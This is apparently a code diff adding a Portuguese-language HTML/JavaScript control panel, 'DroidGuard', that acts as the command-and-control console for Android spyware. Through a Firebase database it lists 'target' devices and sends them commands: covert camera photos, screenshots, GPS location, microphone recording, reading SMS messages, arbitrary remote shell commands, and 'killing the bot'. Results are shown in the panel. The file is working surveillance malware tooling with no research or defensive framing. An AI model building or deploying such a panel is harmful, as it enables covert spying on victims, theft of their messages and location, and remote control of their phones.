@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DroidGuard - Painel de Controle</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0c0f; font-family: 'Segoe UI', sans-serif; color: #eef2ff; padding: 20px; }
+        .header { text-align: center; margin-bottom: 30px; }
+        .header h1 { background: linear-gradient(135deg, #2f8e8b, #4fd1c5); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; }
+        .card { background: #0f1219; border-radius: 20px; padding: 20px; border: 1px solid #1e2a36; }
+        .card h3 { margin-bottom: 15px; border-left: 4px solid #2f8e8b; padding-left: 12px; }
+        button { background: #2f8e8b; border: none; padding: 10px 20px; border-radius: 8px; color: white; margin: 5px; cursor: pointer; transition: 0.2s; }
+        button:hover { transform: scale(1.02); background: #3fa39f; }
+        .kill-btn { background: #9b2c2c; }
+        .kill-btn:hover { background: #c0392b; }
+        select, input { background: #1e2a36; border: none; padding: 10px; border-radius: 8px; color: white; margin: 5px; }
+        .online { color: #2ecc71; }
+        .offline { color: #e74c3c; }
+        .result-img { max-width: 100%; border-radius: 12px; margin-top: 10px; }
+        .sms-list { max-height: 300px; overflow-y: auto; }
+        .sms-item { background: #1a1f2a; padding: 10px; margin: 8px 0; border-radius: 8px; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; }
+        .modal-content { background: #1a1f2a; padding: 30px; border-radius: 20px; min-width: 300px; }
+    </style>
+</head>
+<body>
+<div class="header">
+    <h1><i class="fas fa-shield-alt"></i> DroidGuard</h1>
+    <p>Central de Comando Remoto</p>
+</div>
+
+<div class="card">
+    <h3><i class="fas fa-mobile-alt"></i> Dispositivo Alvo</h3>
+    <select id="deviceSelect" onchange="selectDevice()">
+        <option value="">Selecione um dispositivo...</option>
+    </select>
+    <button onclick="refreshDevices()"><i class="fas fa-sync-alt"></i> Atualizar</button>
+    <span id="deviceStatus"></span>
+</div>
+
+<div class="grid">
+    <div class="card">
+        <h3><i class="fas fa-camera"></i> Câmeras</h3>
+        <button onclick="sendCmd('foto_frontal')"><i class="fas fa-camera"></i> Foto Frontal</button>
+        <button onclick="sendCmd('foto_traseria')"><i class="fas fa-camera-retro"></i> Foto Traseira</button>
+        <div id="fotoResult"></div>
+    </div>
+
+    <div class="card">
+        <h3><i class="fas fa-desktop"></i> Tela</h3>
+        <button onclick="sendCmd('screenshot')"><i class="fas fa-image"></i> Capturar Tela</button>
+        <div id="screenResult"></div>
+    </div>
+
+    <div class="card">
+        <h3><i class="fas fa-map-marker-alt"></i> Localização</h3>
+        <button onclick="sendCmd('gps')"><i class="fas fa-location-dot"></i> Pegar GPS</button>
+        <div id="gpsResult"></div>
+    </div>
+
+    <div class="card">
+        <h3><i class="fas fa-microphone"></i> Áudio</h3>
+        <button onclick="sendCmd('gravar_audio', {duracao: 5})">5s</button>
+        <button onclick="sendCmd('gravar_audio', {duracao: 10})">10s</button>
+        <button onclick="sendCmd('gravar_audio', {duracao: 30})">30s</button>
+        <div id="audioResult"></div>
+    </div>
+
+    <div class="card">
+        <h3><i class="fas fa-envelope"></i> SMS</h3>
+        <button onclick="sendCmd('listar_sms')">Listar SMS</button>
+        <div id="smsResult" class="sms-list"></div>
+    </div>
+
+    <div class="card">
+        <h3><i class="fas fa-terminal"></i> Ações</h3>
+        <button onclick="sendCmd('vibrar', {duracao: 1000})"><i class="fas fa-bell"></i> Vibrar</button>
+        <button onclick="sendCmd('bateria')"><i class="fas fa-battery-full"></i> Bateria</button>
+        <button onclick="openVoiceModal()"><i class="fas fa-volume-up"></i> Falar</button>
+        <button id="killRemoteBtn" class="kill-btn" onclick="matarBotRemoto()" style="display:none">
+            <i class="fas fa-skull"></i> Avada Kedavra
+        </button>
+    </div>
+
+    <div class="card">
+        <h3><i class="fas fa-code"></i> Shell Remoto</h3>
+        <input type="text" id="shellCmd" placeholder="Comando..." style="width: 70%;">
+        <button onclick="execShell()">Executar</button>
+        <pre id="shellResult" style="background:#000; padding:10px; border-radius:8px; margin-top:10px; max-height:200px; overflow:auto;"></pre>
+    </div>
+</div>
+
+<div id="voiceModal" class="modal">
+    <div class="modal-content">
+        <h3>🗣️ Falar no Dispositivo</h3>
+        <input type="text" id="voiceText" placeholder="Digite o texto..." style="width: 100%;">
+        <div style="margin-top: 15px;">
+            <button onclick="sendCmd('falar', {texto: document.getElementById('voiceText').value}); closeVoiceModal()">Enviar</button>
+            <button onclick="closeVoiceModal()">Cancelar</button>
+        </div>
+    </div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+<script>
+    const firebaseConfig = { databaseURL: "https://droidguard-10597-default-rtdb.firebaseio.com/" };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    let currentDevice = null;
+
+    function refreshDevices() {
+        db.ref('dispositivos').once('value', (snap) => {
+            const devices = snap.val() || {};
+            const select = document.getElementById('deviceSelect');
+            select.innerHTML = '<option value="">Selecione...</option>';
+            for (let id in devices) {
+                const d = devices[id];
+                const status = d.status === 'online' ? '🟢' : '🔴';
+                select.innerHTML += `<option value="${id}">${status} ${id} - ${d.bateria || '?'}%</option>`;
+            }
+        });
+    }
+
+    function selectDevice() {
+        currentDevice = document.getElementById('deviceSelect').value;
+        if (currentDevice) {
+            db.ref(`dispositivos/${currentDevice}`).on('value', (snap) => {
+                const d = snap.val();
+                if (d) {
+                    const statusSpan = document.getElementById('deviceStatus');
+                    statusSpan.innerHTML = d.status === 'online' ? '<span class="online">🟢 Online</span>' : '<span class="offline">🔴 Offline</span>';
+                    const killBtn = document.getElementById('killRemoteBtn');
+                    killBtn.style.display = d.status === 'online' ? 'inline-block' : 'none';
+                }
+            });
+        }
+    }
+
+    async function sendCmd(acao, params = {}) {
+        if (!currentDevice) { alert('Selecione um dispositivo!'); return; }
+        
+        const cmdId = Date.now().toString();
+        await db.ref(`comandos/${currentDevice}/${cmdId}`).set({ acao, params, timestamp: Date.now() });
+        
+        const resultRef = db.ref(`resultados/${currentDevice}/${cmdId}`);
+        resultRef.once('value', (snap) => {
+            const res = snap.val();
+            if (res) {
+                if (res.foto) document.getElementById('fotoResult').innerHTML = `<img src="data:image/jpeg;base64,${res.foto}" class="result-img">`;
+                if (res.screen) document.getElementById('screenResult').innerHTML = `<img src="data:image/png;base64,${res.screen}" class="result-img">`;
+                if (res.latitude) document.getElementById('gpsResult').innerHTML = `<p>📍 ${res.latitude}, ${res.longitude}<br>🎯 Precisão: ${res.precisao}m</p><iframe width="100%" height="200" src="https://maps.google.com/maps?q=${res.latitude},${res.longitude}&output=embed"></iframe>`;
+                if (res.audio) document.getElementById('audioResult').innerHTML = `<audio controls src="data:audio/aac;base64,${res.audio}"></audio>`;
+                if (res.sms) {
+                    let html = '';
+                    res.sms.forEach(s => html += `<div class="sms-item"><strong>📱 ${s.numero}</strong><br>${s.texto}<br><small>${s.data}</small></div>`);
+                    document.getElementById('smsResult').innerHTML = html;
+                }
+                if (res.percentage !== undefined) alert(`🔋 Bateria: ${res.percentage}% - ${res.status}`);
+                if (res.stdout !== undefined) document.getElementById('shellResult').innerText = res.stdout || res.stderr;
+                if (res.status === 'vibrou') alert('📳 Vibração enviada!');
+                if (res.status === 'falou') alert('🗣️ Comando de voz enviado!');
+            }
+        });
+        setTimeout(() => resultRef.off(), 30000);
+    }
+
+    function execShell() {
+        const cmd = document.getElementById('shellCmd').value;
+        if (cmd) sendCmd('shell', { cmd: cmd });
+    }
+
+    function matarBotRemoto() {
+        if (confirm('💀 AVADA KEDAVRA! Tem certeza que quer matar o bot?')) {
+            sendCmd('shell', { cmd: "echo 'avadakadabra' > /tmp/droidguard_morrer.txt" });
+            setTimeout(() => { alert('💀 Bot morto!'); refreshDevices(); }, 2000);
+        }
+    }
+
+    function openVoiceModal() { document.getElementById('voiceModal').style.display = 'flex'; }
+    function closeVoiceModal() { document.getElementById('voiceModal').style.display = 'none'; }
+
+    refreshDevices();
+    setInterval(refreshDevices, 10000);
+</script>
+</body>
+</html>
